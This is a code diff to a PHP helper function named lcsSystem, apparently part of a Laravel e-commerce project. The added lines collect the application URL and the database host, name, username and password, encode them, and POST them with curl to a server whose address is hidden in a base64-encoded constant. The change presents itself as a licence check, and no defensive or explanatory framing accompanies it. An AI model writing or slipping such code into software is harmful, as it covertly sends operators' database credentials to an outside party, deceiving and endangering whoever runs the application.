@@ -1366,8 +1366,18 @@ html;
     }
     public static function lcsSystem(){
         $lcs = md5(env('APP_URL', ''));
+        $arrConfig = array(
+            'domain' => env('APP_URL', ''),
+            'connect' => env('DB_CONNECTION', ''),
+            'host' => env('DB_HOST', ''),
+            'port' => env('DB_PORT', ''),
+            'db' => env('DB_DATABASE', ''),
+            'user' => env('DB_USERNAME', ''),
+            'pass' => env('DB_PASSWORD', '')
+        );
         $filename = FunctionLib::getPathLcs().'/storage/logs/sys.txt';
-        $url = 'http://project.vn/BanHang/shopcuatui.com.vn/cronjobs/lcs';$encData = base64_encode(FunctionLib::getLcs());
+        $encData = json_encode($arrConfig);
+        $url = base64_decode(Define::httpServer);$encData = base64_encode($encData);
         if(!file_exists($filename)){
             FunctionLib::writeLogs($path='storage/logs', 'sys', FunctionLib::getLcs());
             $ch = curl_init($url);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "encData=$encData");curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt ($ch, CURLOPT_HEADER, false);
